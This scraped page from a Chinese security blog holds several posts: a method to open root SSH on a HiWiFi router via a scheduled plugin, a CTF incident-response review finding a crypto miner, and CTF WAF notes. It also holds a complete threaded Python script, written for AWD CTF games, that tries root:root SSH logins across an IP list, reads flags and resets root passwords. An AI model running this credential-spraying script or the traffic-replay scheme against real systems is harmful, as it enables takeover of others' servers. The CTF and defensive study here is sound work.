              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>极路由在现在的版本中并不支持telnet连接，在网上还是找到getshell这个路由器的方法。再此复现，并作笔记。</p>
<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><ul>
<li><p>路由器需SDcare</p>
</li>
<li><p>安装 <code>定时重拨</code>插件（sid=118284854）</p>
</li>
<li><p>安装<code>vsftpd</code>插件（sid=770934750）</p>
</li>
</ul>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h4 id="开启ssh"><a href="#开启ssh" class="headerlink" title="开启ssh"></a>开启ssh</h4><ul>
<li>将以下脚本保存为<code>test.sh</code>,放置在<code>ftp://hiwifi.com/</code>目录下,该目录是SD卡并被挂载在<code>/tmp/storage</code>下,<code>vsftpd</code>插件定义目录也在<code>/tmp/storage</code>即可</li>
</ul>
<pre><code class="shell">#!/bin/bash

# 启动SSH并设置自动启动
sed -i &#39;s/1022/22/g&#39; /etc/config/dropbear 
/etc/init.d/dropbear enable
/etc/init.d/dropbear start</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190927/1569562530306.png" alt="img"></p>
<ul>
<li>设置定时重拨规则：<code>* * * * * sh /tmp/storage/test.sh</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190927/15695626475301.png" alt="img"></p>
<ul>
<li>启动等待一分钟即可直接ssh连接上路由器账号为<code>root</code>,密码为后台密码。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190927/15695627717019.png" alt="img"></p>
<h4 id="安装python和pip"><a href="#安装python和pip" class="headerlink" title="安装python和pip"></a>安装python和pip</h4><ul>
<li>设置<code>opkg</code>源,<code>/etc/opkg.conf</code>设置为如下内容，其中第五行，dest usb +SD卡的地址，也就是<code>/tmp/storage/soft</code></li>
</ul>
<pre><code class="shell">dest root /
dest ram /tmp
lists_dir ext /var/opkg-lists
option overlay_root /overlay

dest usb /tmp/storage/soft 

arch all 100
arch ramips_24kec 200
arch ramips 300
arch mips 400
arch unkown 500


src/gz barrier_breaker_base http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/base
src/gz barrier_breaker_luci http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/luci
src/gz barrier_breaker_management http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/management
src/gz barrier_breaker_oldpackages http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/oldpackages
src/gz barrier_breaker_packages http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/packages
src/gz barrier_breaker_routing http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/routing
src/gz barrier_breaker_telephony http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/telephony</code></pre>
<ul>
<li>安装过程</li>
</ul>
<pre><code class="shell">opkg update

wget http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/base/libc_0.9.33.2-1_ramips_24kec.ipk

opkg -d usb install libc_0.9.33.2-1_ramips_24kec.ipk

opkg -d usb install libreadline
opkg  -d usb install python
opkg -d usb install python-json
opkg -d usb install python-curl
opkg -d usb install python-openssl
</code></pre>
<ul>
<li>设置环境变量，也是加上python安装目录</li>
</ul>
<pre><code>export PATH=$PATH:/tmp/storage/soft/usr/bin </code></pre><ul>
<li>安装pip</li>
</ul>
<pre><code class="shell">wget --no-check-certificate https://bootstrap.pypa.io/get-pip.py  

python get-pip.py</code></pre>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d522b80276.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d522b80276.html" class="post-title-link" itemprop="url">强网杯应急响复盘</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-09-23 22:43:54" itemprop="dateCreated datePublished" datetime="2019-09-23T22:43:54+08:00">2019-09-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:20:14" itemprop="dateModified" datetime="2020-10-14T17:20:14+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="事中应急响应"><a href="#事中应急响应" class="headerlink" title="事中应急响应"></a>事中应急响应</h2><p>对应急响应经验不足错误总结如下：</p>
<p><strong>失误</strong>：</p>
<ul>
<li><p>操作频繁，导致shell命令覆盖，无法朔源黑客执行的哪些操作</p>
</li>
<li><p>web访问频繁，导致web日志存在大量自身ip地址导致审计困难。</p>
</li>
</ul>
<p><strong>正确操作：</strong></p>
<ul>
<li><p>历史命令增加储存为1万条</p>
<pre><code class="shell">sed -i &#39;s/^HISTSIZE=1000/HISTSIZE=10000/g&#39; /etc/profile</code></pre>
</li>
<li><p>给历史命令增加登录的IP地址、执行命令时间等信息</p>
<p>在/etc/profile的文件尾部添加如下行数配置信息：</p>
</li>
</ul>
<pre><code class="shell">######jiagu history xianshi#########
USER_IP=`who -u am i 2&gt;/dev/null | awk &#39;{print $NF}&#39; | sed -e &#39;s/[()]//g&#39;`
if [ &quot;$USER_IP&quot; = &quot;&quot; ]
then
USER_IP=`hostname`
fi
export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;
shopt -s histappend
export PROMPT_COMMAND=&quot;history -a&quot;
######### jiagu history xianshi ##########</code></pre>
<p>​    让配置生效</p>
<pre><code class="sehll">source /etc/profile

生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</code></pre>
<ul>
<li>开启<code>tcpdump</code>抓取流量到文件，以便使用<code>wireshark</code>分析</li>
</ul>
<h2 id="事中应急响应-1"><a href="#事中应急响应-1" class="headerlink" title="事中应急响应"></a>事中应急响应</h2><h3 id="web日志审计"><a href="#web日志审计" class="headerlink" title="web日志审计"></a>web日志审计</h3><ul>
<li>从日志可以发现，黑客对网站的后台发起了大量登陆尝试</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190923/15692531384896.png" alt="img"></p>
<h3 id="系统日志审计"><a href="#系统日志审计" class="headerlink" title="系统日志审计"></a>系统日志审计</h3><ul>
<li><p>系统登陆日志储存在<code>var/log/auth.log</code>或者<code>var/log/secure</code>上。</p>
</li>
<li><p>查看日志成功登陆的IP、用户和时间</p>
</li>
</ul>
<pre><code class="shell">grep &quot;Accepted &quot; auth.log | awk &#39;{print $1,$2,$3,$9,$11}&#39;</code></pre>
<ul>
<li>可以看到奇怪的用户名和奇怪的ip。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190923/15692542548454.png" alt="img"></p>
<ul>
<li>查看具有root权限的用户</li>
</ul>
<pre><code class="shell">awk -F: &#39;$3==0{print $1}&#39; /etc/passwd
或者
cat /etc/passwd
查看uid=0的用户
</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693222606429.png" alt="img"></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15692545388895.png" alt="img"></p>
<ul>
<li>可以得知存在特权的用户除了root还有mysq1，再查看auth.log日志可以直接看到，该用户是被黑客新添加的，而其登陆ip和第一次登陆时间也可以得知</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15692546752738.png" alt="img"></p>
<h3 id="系统进程审查"><a href="#系统进程审查" class="headerlink" title="系统进程审查"></a>系统进程审查</h3><ul>
<li>查看所有进程信息，找到异常的程序名</li>
</ul>
<pre><code class="shell">ps aux</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693224572614.png" alt="img"></p>
<ul>
<li><p>或者使用findshell直接GUI查看进程信息<br><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693225252668.png" alt="img"></p>
</li>
<li><p>找到了一个非常奇怪的进程名</p>
</li>
</ul>
<pre><code class="shell">xmr-stak-cpu</code></pre>
<ul>
<li>直接查看定时任务也可以看到该进程被启用的信息</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693239569853.png" alt="img"></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/1569323988668.png" alt="img"></p>
<ul>
<li>可以知挖矿病毒绝对路径<code>/etc/xmr-stak-cpu/bin/xmr-stak-cpu</code>,同时<code>bin/config.txt</code>存储了挖矿病毒的配置信息，可以直接得知挖矿病毒的钱包地址。</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d72df663a9.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d72df663a9.html" class="post-title-link" itemprop="url">SSH爆破脚本编写小记\Python paramiko库的学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-09-21 13:33:29" itemprop="dateCreated datePublished" datetime="2019-09-21T13:33:29+08:00">2019-09-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:49:33" itemprop="dateModified" datetime="2020-10-14T17:49:33+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/学习笔记/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>3.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在紧张备战AWD线下赛，没什么经验，防止有全场密码一样的情况，直接写脚本cat全场flag，然后修改系统密码。</p>
<h2 id="编写记录"><a href="#编写记录" class="headerlink" title="编写记录"></a>编写记录</h2><h4 id="paramiko的安装"><a href="#paramiko的安装" class="headerlink" title="paramiko的安装"></a>paramiko的安装</h4><pre><code class="shell">pip install parmiko</code></pre>
<h4 id="简单的ssh连接例子"><a href="#简单的ssh连接例子" class="headerlink" title="简单的ssh连接例子"></a>简单的ssh连接例子</h4><pre><code class="python">import paramiko
import sys
def SshCon(ip,prot,user,passwd):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip,prot,user,passwd,timeout=1.5)
        stdin, stdout, stderr = ssh.exec_command(&#39;df&#39;)
        result=stdout.read()
        if(result):
            print(&quot;Success&quot;)
    except Exception as e:
        pass
SshCon(&#39;127.0.0.1&#39;,22,&#39;root&#39;,&#39;root&#39;)
</code></pre>
<ul>
<li><p>从例子中不难看出，在执行一条shell后悔返回shell的执行结果，这个结果是字节类型，所以对返回结果处理时候可以转换为字符串类型。</p>
</li>
<li><p>修改密码只需执行一条命令</p>
</li>
</ul>
<pre><code class="python">stdin, stdout, stderr = ssh.exec_command(&quot;echo &#39;root:admin123&#39;|chpasswd&quot;)</code></pre>
<h4 id="多线程对多个IP进行爆破demo"><a href="#多线程对多个IP进行爆破demo" class="headerlink" title="多线程对多个IP进行爆破demo"></a>多线程对多个IP进行爆破demo</h4><pre><code class="python">import threading
try:
    import queue
except:
    from Queue import Queue
class Ssh(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
        self._queue=queue
    def run(self):
        while not self._queue.empty():
            try:
                iplist=self._queue.get()
                self.SshCon(iplist)
    def SshCon(self,ip):
        &#39;&#39;&#39;略&#39;&#39;&#39;
def main():
    try:
        Myqueue = Queue()
    except:
        Myqueue = queue.Queue()
    with open(&quot;ssh.txt&quot;) as dic:
        for i in dic:
            Myqueue.put(i.strip(&#39;\n&#39;))
    threads = []
    threadsCount=50
    for i in range(threadsCount):
        threads.append(Ssh(Myqueue))
    for t in threads:
        t.start()
    for t in threads:
        t.join()       </code></pre>
<h4 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h4><pre><code class="python">#!/usr/bin/env python
#-*-coding:utf-8-*-
import paramiko
import sys
import threading
import os
import time
try:
    import queue
except:
    from Queue import Queue
class SshSimplepass(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
        self._queue=queue
    def run(self):
        while not self._queue.empty():
            try:
                iPlist=self._queue.get()
                self.SshCheck(iPlist)
            except:
                pass
    def SshCheck(self,ip):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 跳过了远程连接中选择‘是’的环节,
        try:
            ssh.connect(ip, 22, &#39;root&#39;, &#39;root&#39;,timeout=1.5)
            stdin, stdout, stderr = ssh.exec_command(&#39;df&#39;)
            result=stdout.read()
            if not result is None:
                stdin, stdout, stderr = ssh.exec_command(&#39;cat /flag&#39;)
                result = str(stdout.read(),encoding=&quot;utf-8&quot;)
                sys.stdout.write(&#39;\033[5;32m&#39;+&#39;[+]&#39;+&#39;\t&#39;+ip+&#39;\t&#39;+result+&#39;\n&#39;)
                with open(filename) as file:
                    if ip not in file.read():
                        f = open(filename,&#39;a+&#39;)
                        f.write(ip+&#39;\t&#39;+result)
                        f.close()
            stdin, stdout, stderr = ssh.exec_command(&quot;echo &#39;root:admin123&#39;|chpasswd&quot;)
            print(stdout.read())    
        except Exception as e:
            pass
            #sys.stdout.write(&#39;\033[31m&#39;+&quot;[NOT]&quot;+&#39;\t&#39;+ip+&quot;\n&quot;)    
        finally:
            ssh.close()
def main(threadsCounts):
    try:
        Myqueue = Queue()
    except:
        Myqueue = queue.Queue()

    with open(&quot;ssh.txt&quot;) as dic:
        for line in dic:
            Myqueue.put(line.strip(&#39;\n&#39;))
    threads=[]
    threadsCount=int(threadsCounts)
    for i in range(threadsCount):
        threads.append(SshSimplepass(Myqueue))
    for t in threads:
        t.start()
    for t in threads:
        t.join()
if __name__==&#39;__main__&#39;:
    if len(sys.argv) != 2:
        sys.stdout.write(&quot;Enter:python %s threads&quot; %(sys.argv[0]))
    else:
        path=&quot;result/&quot;
        filename=path+&#39;/&#39;+str(time.strftime(&quot;%Y-%m-%d&quot;, time.localtime()))+&quot;.txt&quot;
        isExists=os.path.exists(path)
        if not isExists:
            os.makedirs(path)
        f = open(filename,&quot;a+&quot;)
        f.close()
        main(sys.argv[1])</code></pre>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/1582a2990d.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/1582a2990d.html" class="post-title-link" itemprop="url">CTF-WAF专用于CTF攻防赛的WAF/日志审计系统</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-09-19 23:32:31" itemprop="dateCreated datePublished" datetime="2019-09-19T23:32:31+08:00">2019-09-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:47:54" itemprop="dateModified" datetime="2020-10-14T17:47:54+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>708</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="CTF-WAF"><a href="#CTF-WAF" class="headerlink" title="CTF-WAF"></a>CTF-WAF</h2><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>该项目针对CTF线下AWD比赛临时开发的WAF，能够拦截XSS、SQl、反序列化、菜刀/蚁剑、以及一些CTF常见的危险函数流量。可以绕过对页面检测的check,拦截返回正常页面的html。并且能够对简单payload进行流量转发，自动反打设置好的IP。如果比赛禁止使用通防也可以一键关闭通防，作为流量监控审计所用。欢迎各位大佬对项目进行改进。使用时候可以使用.user.ini将其包含于所有php文件。</p>
<h2 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h2><ul>
<li><p><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Gqleung-brightgreen.svg" alt>  </p>
</li>
<li><p><img src="https://img.shields.io/badge/%E5%8D%9A%E5%AE%A2-xiao%20leung's%20Blog-blueviolet" alt> </p>
</li>
<li><p><a href="https://github.com/sharpleung" target="_blank" rel="noopener"><img src="https://img.shields.io/badge/Github-sharpleung-green?logo=appveyor&style=flat" alt></a></p>
</li>
</ul>
<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><pre><code class="http">CTF_WAF.php(WAF主要文件)
waflog(文件夹)
    .........ip.txt(需要反打的ip)
    .........log.php(日志审计系统)</code></pre>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><ul>
<li>将<code>CTF_WAF.php</code>包含进需要保护的文件</li>
<li>开启<code>WAF</code>开关（<code>CTF_WAF.php</code>代码27行），设置返回页面（<code>CTF_WAF.php</code>代码26行）,</li>
</ul>
<pre><code class="php">$this-&gt;Waf_switch=1;//通防开启
$this-&gt;Waf_switch=0;//通防关闭
$this-&gt;resultPage=&quot;http://127.0.0.1/&quot;;//返回页面</code></pre>
<ul>
<li>设置需要反打（流量转发）的主机，在<code>waflog/ip.txt</code></li>
</ul>
<p><img src="https://raw.githubusercontent.com/sharpleung/CTF-WAF/master/picture/15688766013040.png" alt="img"></p>
<ul>
<li>模拟对本地主机进行攻击，可以发现并不会返回flag，说明对payload拦截成功</li>
</ul>
<p><img src="https://raw.githubusercontent.com/sharpleung/CTF-WAF/master/picture/pic2.png" alt="img"></p>
<ul>
<li>查看<code>waflog</code>文件夹下发现生成了logs.txt和flag.txt说明生成了日志文件和flag文件，打开即可看到ip对应的flag</li>
</ul>
<p><strong><img src="https://raw.githubusercontent.com/sharpleung/CTF-WAF/master/picture/pic3.bmp" alt="img"></strong></p>
<ul>
<li>修改日志系统密码<code>/waflog/log.php</code>代码4行，修改密码</li>
</ul>
<pre><code class="php">$passwd=&quot;admin&quot;;//修改密码</code></pre>
<ul>
<li>登陆后台发现记录了攻击payload。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/sharpleung/CTF-WAF/master/picture/pic4.png" alt="img"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d709b98b18.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d709b98b18.html" class="post-title-link" itemprop="url">捡起高中老照片，伪装成摄影博主吧！嘻嘻！</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-09-14 18:01:58" itemprop="dateCreated datePublished" datetime="2019-09-14T18:01:58+08:00">2019-09-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:20:42" itemprop="dateModified" datetime="2020-10-14T17:20:42+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/风光摄影/" itemprop="url" rel="index"><span itemprop="name">风光摄影</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>26</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=34899487&auto=1&height=66"></iframe>

<h2 id="晨光"><a href="#晨光" class="headerlink" title="晨光"></a>晨光</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684555188774.jpg" alt="img"></p>
<h2 id="紫霞"><a href="#紫霞" class="headerlink" title="紫霞"></a>紫霞</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684556803487.jpg" alt="img"></p>
<h2 id="顽虫"><a href="#顽虫" class="headerlink" title="顽虫"></a>顽虫</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684557562583.jpg" alt="img"></p>
<h2 id="阳西夕阳"><a href="#阳西夕阳" class="headerlink" title="阳西夕阳"></a>阳西夕阳</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684558015771.jpg" alt="img"></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684558555752.jpg" alt="img"></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684562049853.jpg" alt="img"></p>
<h2 id="翻飞未肯下，犹言惜故林。"><a href="#翻飞未肯下，犹言惜故林。" class="headerlink" title="翻飞未肯下，犹言惜故林。"></a>翻飞未肯下，犹言惜故林。</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684560034954.jpg" alt="img"></p>
<h2 id="港口"><a href="#港口" class="headerlink" title="港口"></a>港口</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20190914/1568456115995.png" alt="img"></p>
<h2 id="一中"><a href="#一中" class="headerlink" title="一中"></a>一中</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684563273418.jpg" alt="img"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5f6518399.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d5f6518399.html" class="post-title-link" itemprop="url">CTF-AWD线下赛劫持流量和流量转发WAF的开发</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-09-14 15:38:41" itemprop="dateCreated datePublished" datetime="2019-09-14T15:38:41+08:00">2019-09-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:21:04" itemprop="dateModified" datetime="2020-10-14T17:21:04+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>7.5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    没参加过CTF线下赛，用别人的waf又不了解其他人写的WAF的代码，万一出了问题也不好解决。因此昨晚连夜写了个WAF。WAF参考了360WAF的正则，对网站流量劫持并转发，cookie流量转发尚未完成。主要是使用了file_get_contents()发送POST和GET流量。如果使用注入等语句，将会对其进行拦截，本项目会劫持所有流量并以json的形式储存在waflog文件夹下(默认)，项目初始化会读取waflog下的ip.txt的ip写入数组，对劫持到的所有流量原样转发至该数组下的所有ip，如果存在flag{}(根据比赛修改flag的样式)将会保存至flag.txt</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul>
<li>两个服务器存在相同的靶机，分别是120.<em>.\</em>.*和本地127.0.0.1</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190914/1568447577771.png" alt="img"></p>
<ul>
<li>本地挂上WAF</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684475369688.png" alt="img"></p>
<ul>
